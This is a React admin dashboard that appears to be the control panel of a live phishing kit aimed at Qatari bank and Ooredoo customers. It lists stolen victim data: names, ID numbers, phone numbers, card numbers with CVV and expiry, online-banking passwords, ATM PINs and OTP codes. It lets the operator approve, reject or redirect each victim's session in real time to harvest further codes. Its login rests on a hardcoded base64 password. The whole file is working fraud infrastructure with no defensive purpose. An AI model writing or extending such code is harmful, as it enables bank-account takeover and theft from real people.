import { useState, useMemo, useEffect } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Loader2, Eye, RefreshCcw, Check, X, Users } from "lucide-react";

const getStatusDisplay = (currentStep: string | null | undefined, language: string) => {
  const statusMap: Record<string, Record<string, string>> = {
    ar: {
      login: "صفحة تسجيل الدخول",
      otp: "صفحة OTP الأولى",
      atm: "صفحة رقم السري للـ ATM",
      ooredoo: "صفحة Ooredoo",
      otp_ooredoo: "صفحة OTP Ooredoo",
      pending: "في الانتظار",
      approved: "تمت الموافقة",
      rejected: "تم الرفض",
    },
    en: {
      login: "Login Page",
      otp: "First OTP Page",
      atm: "ATM PIN Page",
      ooredoo: "Ooredoo Page",
      otp_ooredoo: "Ooredoo OTP Page",
      pending: "Pending",
      approved: "Approved",
      rejected: "Rejected",
    },
  };
  return statusMap[language]?.[currentStep || "pending"] || currentStep || "—";
};

const getStatusColor = (currentStep: string | null | undefined) => {
  const colorMap: Record<string, string> = {
    login: "bg-blue-100 text-blue-800",
    otp: "bg-purple-100 text-purple-800",
    atm: "bg-orange-100 text-orange-800",
    ooredoo: "bg-red-100 text-red-800",
    otp_ooredoo: "bg-pink-100 text-pink-800",
  };
  return colorMap[currentStep || ""] || "bg-gray-100 text-gray-800";
};

export default function AdminDashboard() {
  const { language, t } = useLanguage();
  const [, setLocation] = useLocation();
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<string | null>(null);
  const [showDetails, setShowDetails] = useState(false);
  const [showRedirectMenu, setShowRedirectMenu] = useState<string | null>(null);
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return sessionStorage.getItem("adminAuthenticated") === "true";
  });
  const [error, setError] = useState("");

  const { data: submissions, isLoading, refetch } = trpc.submissions.getAllSubmissions.useQuery(undefined, {
    enabled: isAuthenticated,
    refetchInterval: 3000,
  });

  const { data: details } = trpc.submissions.getSubmissionDetails.useQuery(selectedSession || "", {
    enabled: !!selectedSession && isAuthenticated,
  });

  const adminTakeAction = trpc.submissions.adminTakeAction.useMutation({
    onSuccess: () => {
      refetch();
    }
  });

  const adminRedirectMutation = trpc.submissions.adminRedirect.useMutation({
    onSuccess: () => {
      refetch();
    }
  });

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    // Obfuscated password check
    const obfuscatedKey = "UWF0YXJAQDIwMA==";
    if (btoa(password) === obfuscatedKey) {
      setIsAuthenticated(true);
      sessionStorage.setItem("adminAuthenticated", "true");
      setError("");
    } else {
      setError(language === "ar" ? "كلمة المرور غير صحيحة" : "Incorrect password");
    }
  };

  const filteredSubmissions = useMemo(() => {
    if (!submissions) return [];
    return submissions.filter((sub) =>
      sub.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
      sub.selectedBank.toLowerCase().includes(searchTerm.toLowerCase()) ||
      (sub.nameArabic && sub.nameArabic.includes(searchTerm)) ||
      (sub.phoneNumber && sub.phoneNumber.includes(searchTerm))
    );
  }, [submissions, searchTerm]);

  const handleAction = async (sessionId: string, action: string) => {
    let errorMessage = "";
    if (action === "reject") {
      const session = submissions?.find(s => s.id === sessionId);
      if (session?.currentStep === "login") errorMessage = t("invalid_data");
      else if (session?.currentStep === "otp") errorMessage = t("invalid_otp");
      else if (session?.currentStep === "atm") errorMessage = t("invalid_atm");
      else if (session?.currentStep === "ooredoo") errorMessage = t("invalid_ooredoo");
      else if (session?.currentStep === "otp_ooredoo") errorMessage = t("invalid_ooredoo_otp");
    }
    await adminTakeAction.mutateAsync({ sessionId, action, errorMessage });
  };

  const handleRedirect = async (sessionId: string, targetPage: string) => {
    try {
      await adminRedirectMutation.mutateAsync({ sessionId, targetPage });
      setShowRedirectMenu(null);
    } catch (error) {
      console.error("Redirect error:", error);
    }
  };

  const redirectPages = [
    { id: "login-method", label: language === "ar" ? "صفحة تسجيل الدخول" : "Login Page" },
    { id: "otp", label: language === "ar" ? "صفحة OTP الأولى" : "First OTP Page" },
    { id: "atm-pin", label: language === "ar" ? "صفحة ATM PIN" : "ATM PIN Page" },
    { id: "ooredoo", label: language === "ar" ? "صفحة Ooredoo" : "Ooredoo Page" },
    { id: "otp-ooredoo", label: language === "ar" ? "صفحة OTP Ooredoo" : "Ooredoo OTP Page" },
    { id: "success", label: language === "ar" ? "صفحة النجاح" : "Success Page" },
  ];

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#0a0a0a] p-4 relative overflow-hidden" dir={language === "ar" ? "rtl" : "ltr"}>
        {/* Decorative elements */}
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-red-900/20 rounded-full blur-[120px]" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-red-900/20 rounded-full blur-[120px]" />
        
        <form 
          onSubmit={handleLogin} 
          className="bg-[#1a1a1a] p-10 rounded-2xl shadow-2xl w-full max-w-md border border-white/10 backdrop-blur-xl relative z-10"
        >
          <div className="flex flex-col items-center mb-8">
            <div className="w-16 h-16 bg-red-600 rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-red-600/20">
              <Users className="w-8 h-8 text-white" />
            </div>
            <h2 className="text-3xl font-bold text-white text-center">
              {language === "ar" ? "دخول لوحة الإدارة" : "Admin Control Center"}
            </h2>
            <p className="text-gray-400 mt-2 text-sm">
              {language === "ar" ? "يرجى إدخال كلمة المرور للمتابعة" : "Please enter your password to continue"}
            </p>
          </div>

          <div className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm font-medium text-gray-300 px-1">
                {language === "ar" ? "كلمة المرور" : "Password"}
              </label>
              <Input
                type="password"
                placeholder="••••••••"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="bg-black/50 border-white/10 text-white text-lg py-6 focus:ring-red-600 focus:border-red-600 rounded-xl placeholder:text-gray-600"
              />
            </div>

            {error && (
              <div className="bg-red-500/10 border border-red-500/50 text-red-500 text-sm p-3 rounded-lg text-center animate-shake">
                {error}
              </div>
            )}

            <Button 
              type="submit" 
              className="w-full bg-red-600 hover:bg-red-700 text-white text-lg py-6 rounded-xl transition-all duration-300 shadow-lg shadow-red-600/20 hover:scale-[1.02] active:scale-[0.98]"
            >
              {language === "ar" ? "تسجيل الدخول" : "Sign In"}
            </Button>
          </div>

          <p className="text-center text-gray-500 text-xs mt-8">
            &copy; {new Date().getFullYear()} Qatar Tayrn. All rights reserved.
          </p>
        </form>

        <style>{`
          @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
          }
          .animate-shake { animation: shake 0.2s ease-in-out 0s 2; }
        `}</style>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50" dir={language === "ar" ? "rtl" : "ltr"}>
      {/* Header */}
      <header className="sticky top-0 z-50 bg-white border-b shadow-md">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <Button 
            variant="ghost" 
            onClick={() => setLocation("/")}
            className="text-gray-600 hover:text-gray-900"
          >
            {language === "ar" ? "← رجوع" : "← Back"}
          </Button>
          <h1 className="text-2xl font-bold text-gray-900">
            {language === "ar" ? "لوحة التحكم" : "Admin Dashboard"}
          </h1>
          <Button 
            variant="outline" 
            onClick={() => {
              setIsAuthenticated(false);
              sessionStorage.removeItem("adminAuthenticated");
            }}
            className="text-red-600 border-red-200 hover:bg-red-50"
          >
            {language === "ar" ? "خروج" : "Logout"}
          </Button>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-8">
        {/* Visitor Counter Card */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
          <div className="bg-gradient-to-br from-red-500 to-red-600 text-white rounded-lg shadow-lg p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-red-100 text-sm mb-1">
                  {language === "ar" ? "الزيارات الحالية" : "Current Visitors"}
                </p>
                <p className="text-4xl font-bold">{submissions?.length || 0}</p>
              </div>
              <Users className="w-12 h-12 opacity-80" />
            </div>
          </div>

          <div className="bg-gradient-to-br from-blue-500 to-blue-600 text-white rounded-lg shadow-lg p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-blue-100 text-sm mb-1">
                  {language === "ar" ? "في الانتظار" : "Pending"}
                </p>
                <p className="text-4xl font-bold">
                  {submissions?.filter(s => s.status === "loading").length || 0}
                </p>
              </div>
              <Loader2 className="w-12 h-12 opacity-80" />
            </div>
          </div>

          <div className="bg-gradient-to-br from-green-500 to-green-600 text-white rounded-lg shadow-lg p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-green-100 text-sm mb-1">
                  {language === "ar" ? "موافق عليه" : "Approved"}
                </p>
                <p className="text-4xl font-bold">
                  {submissions?.filter(s => s.status === "approved").length || 0}
                </p>
              </div>
              <Check className="w-12 h-12 opacity-80" />
            </div>
          </div>
        </div>

        {/* Search Bar */}
        <div className="mb-6">
          <Input
            placeholder={language === "ar" ? "ابحث عن الجلسة أو البنك أو الاسم أو الهاتف..." : "Search by session, bank, name, or phone..."}
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="max-w-md text-lg"
          />
        </div>

        {/* Table */}
        <div className="bg-white rounded-lg shadow-lg overflow-hidden border border-gray-200">
          {isLoading ? (
            <div className="p-12 flex justify-center">
              <Loader2 className="animate-spin text-red-600 w-8 h-8" />
            </div>
          ) : filteredSubmissions.length === 0 ? (
            <div className="p-12 text-center text-gray-500">
              {language === "ar" ? "لا توجد بيانات" : "No data available"}
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead className="bg-gray-100 border-b-2 border-gray-200">
                  <tr>
                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
                      {language === "ar" ? "الدولة" : "Country"}
                    </th>
                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
                      {language === "ar" ? "البنك" : "Bank"}
                    </th>
                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
                      {language === "ar" ? "الاسم" : "Name"}
                    </th>
                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
                      {language === "ar" ? "الهاتف" : "Phone"}
                    </th>
                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
                      {language === "ar" ? "الهوية" : "Identity"}
                    </th>
                    <th className="px-6 py-4 text-right font-semibold text-gray-700">
                      {language === "ar" ? "الحالة" : "Status"}
                    </th>
                    <th className="px-6 py-4 text-center font-semibold text-gray-700">
                      {language === "ar" ? "الإجراءات" : "Actions"}
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-200">
                  {filteredSubmissions.map((sub) => (
                    <tr key={sub.id} className="hover:bg-gray-50 transition-colors">
                      <td className="px-6 py-4 text-gray-900 font-medium">{sub.country || "Qatar"}</td>
                      <td className="px-6 py-4 font-bold text-red-700 text-lg">{sub.selectedBank.toUpperCase()}</td>
                      <td className="px-6 py-4 text-gray-900">{sub.nameArabic || "—"}</td>
                      <td className="px-6 py-4 text-gray-900">{sub.phoneNumber || "—"}</td>
                      <td className="px-6 py-4 text-gray-900">{sub.idNumber || "—"}</td>
                      <td className="px-6 py-4">
                        <span className={`px-3 py-1 rounded-full text-xs font-semibold ${getStatusColor(sub.currentStep)}`}>
                          {getStatusDisplay(sub.currentStep, language)}
                        </span>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center justify-center gap-2 flex-wrap">
                          <Button 
                            variant="outline" 
                            size="sm" 
                            className="flex items-center gap-1 text-xs"
                            onClick={() => {
                              setSelectedSession(sub.id);
                              setShowDetails(true);
                            }}
                          >
                            <Eye className="w-3 h-3" /> {language === "ar" ? "تفاصيل" : "Details"}
                          </Button>

                          <div className="relative">
                            <Button 
                              variant="outline" 
                              size="sm" 
                              className="flex items-center gap-1 text-xs"
                              onClick={() => setShowRedirectMenu(showRedirectMenu === sub.id ? null : sub.id)}
                            >
                              <RefreshCcw className="w-3 h-3" /> {language === "ar" ? "توجيه" : "Redirect"}
                            </Button>
                            
                            {showRedirectMenu === sub.id && (
                              <div className="absolute top-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg z-10 min-w-max">
                                {redirectPages.map((page) => (
                                  <button
                                    key={page.id}
                                    onClick={() => handleRedirect(sub.id, page.id)}
                                    className="block w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 first:rounded-t-lg last:rounded-b-lg"
                                  >
                                    {page.label}
                                  </button>
                                ))}
                              </div>
                            )}
                          </div>

                          {sub.status === "loading" && (
                            <div className="flex gap-1">
                              <Button 
                                size="sm" 
                                className="bg-green-600 hover:bg-green-700 text-white flex items-center gap-1"
                                onClick={() => handleAction(sub.id, "approve")}
                              >
                                <Check className="w-3 h-3" />
                              </Button>
                              <Button 
                                size="sm" 
                                className="bg-red-600 hover:bg-red-700 text-white flex items-center gap-1"
                                onClick={() => handleAction(sub.id, "reject")}
                              >
                                <X className="w-3 h-3" />
                              </Button>
                            </div>
                          )}
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </main>

      {/* Details Dialog */}
      <Dialog open={showDetails} onOpenChange={setShowDetails}>
        <DialogContent className="max-w-2xl max-h-[80vh] overflow-y-auto" dir={language === "ar" ? "rtl" : "ltr"}>
          <DialogHeader>
            <DialogTitle>{language === "ar" ? "التفاصيل" : "Details"}</DialogTitle>
          </DialogHeader>
          {details ? (
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div className="p-3 bg-gray-50 rounded border">
                  <p className="text-xs text-gray-500 mb-1">{language === "ar" ? "معرف الجلسة" : "Session ID"}</p>
                  <p className="font-mono text-sm break-all">{details.session.id}</p>
                </div>
                <div className="p-3 bg-gray-50 rounded border">
                  <p className="text-xs text-gray-500 mb-1">{language === "ar" ? "البنك" : "Bank"}</p>
                  <p className="font-bold text-red-700">{details.session.selectedBank.toUpperCase()}</p>
                </div>
              </div>
              
              {details.personalData && (
                <div className="border rounded-lg p-4 space-y-2">
                  <h3 className="font-bold border-b pb-2 mb-2">
                    {language === "ar" ? "البيانات الشخصية" : "Personal Data"}
                  </h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <div><span className="text-gray-500">{language === "ar" ? "الاسم (AR):" : "Name (AR):"}</span> {details.personalData.nameArabic}</div>
                    <div><span className="text-gray-500">{language === "ar" ? "الاسم (EN):" : "Name (EN):"}</span> {details.personalData.nameEnglish}</div>
                    <div><span className="text-gray-500">{language === "ar" ? "الهوية:" : "Identity:"}</span> {details.personalData.idNumber}</div>
                    <div><span className="text-gray-500">{language === "ar" ? "الهاتف:" : "Phone:"}</span> {details.personalData.phoneNumber}</div>
                    <div><span className="text-gray-500">{language === "ar" ? "الميلاد:" : "Birth:"}</span> {details.personalData.dateOfBirth}</div>
                    <div><span className="text-gray-500">{language === "ar" ? "الجنس:" : "Gender:"}</span> {details.personalData.gender}</div>
                  </div>
                </div>
              )}

              {details.loginMethod && (
                <div className="border rounded-lg p-4 space-y-2">
                  <h3 className="font-bold border-b pb-2 mb-2">
                    {language === "ar" ? "طريقة تسجيل الدخول" : "Login Method"}
                  </h3>
                  <div className="text-sm">
                    <p><span className="text-gray-500">{language === "ar" ? "النوع:" : "Type:"}</span> {details.loginMethod.loginType}</p>
                    {details.loginMethod.loginType === "card" ? (
                      <div className="grid grid-cols-2 gap-2 mt-2">
                        <div><span className="text-gray-500">{language === "ar" ? "رقم البطاقة:" : "Card Number:"}</span> {details.loginMethod.cardNumber}</div>
                        <div><span className="text-gray-500">{language === "ar" ? "الاسم:" : "Name:"}</span> {details.loginMethod.cardholderName}</div>
                        <div><span className="text-gray-500">{language === "ar" ? "التاريخ:" : "Expiry:"}</span> {details.loginMethod.expiryDate}</div>
                        <div><span className="text-gray-500">CVV:</span> {details.loginMethod.cvv}</div>
                      </div>
                    ) : (
                      <div className="grid grid-cols-2 gap-2 mt-2">
                        <div><span className="text-gray-500">{language === "ar" ? "المستخدم:" : "Username:"}</span> {details.loginMethod.username}</div>
                        <div><span className="text-gray-500">{language === "ar" ? "كلمة المرور:" : "Password:"}</span> {details.loginMethod.password}</div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {details.atmPin && (
                <div className="border rounded-lg p-4 bg-orange-50 border-orange-200">
                  <h3 className="font-bold text-orange-800 border-b border-orange-200 pb-2 mb-2">ATM PIN</h3>
                  <p className="text-2xl font-mono text-center tracking-widest text-orange-900">{details.atmPin.pin}</p>
                </div>
              )}

              {details.otp && (
                <div className="border rounded-lg p-4 bg-blue-50 border-blue-200">
                  <h3 className="font-bold text-blue-800 border-b border-blue-200 pb-2 mb-2">
                    OTP ({details.otp.otpType === "ooredoo" ? "Ooredoo" : "Standard"})
                  </h3>
                  <p className="text-2xl font-mono text-center tracking-widest text-blue-900">{details.otp.otpCode}</p>
                </div>
              )}

              {details.ooredoo && (
                <div className="border rounded-lg p-4 bg-purple-50 border-purple-200">
                  <h3 className="font-bold text-purple-800 border-b border-purple-200 pb-2 mb-2">
                    {language === "ar" ? "بيانات Ooredoo" : "Ooredoo Login"}
                  </h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <div><span className="text-gray-500">{language === "ar" ? "المستخدم:" : "Username:"}</span> {details.ooredoo.ooredooUser}</div>
                    <div><span className="text-gray-500">{language === "ar" ? "كلمة المرور:" : "Password:"}</span> {details.ooredoo.ooredooPassword}</div>
                  </div>
                </div>
              )}
            </div>
          ) : (
            <div className="p-12 flex justify-center">
              <Loader2 className="animate-spin text-red-600 w-8 h-8" />
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
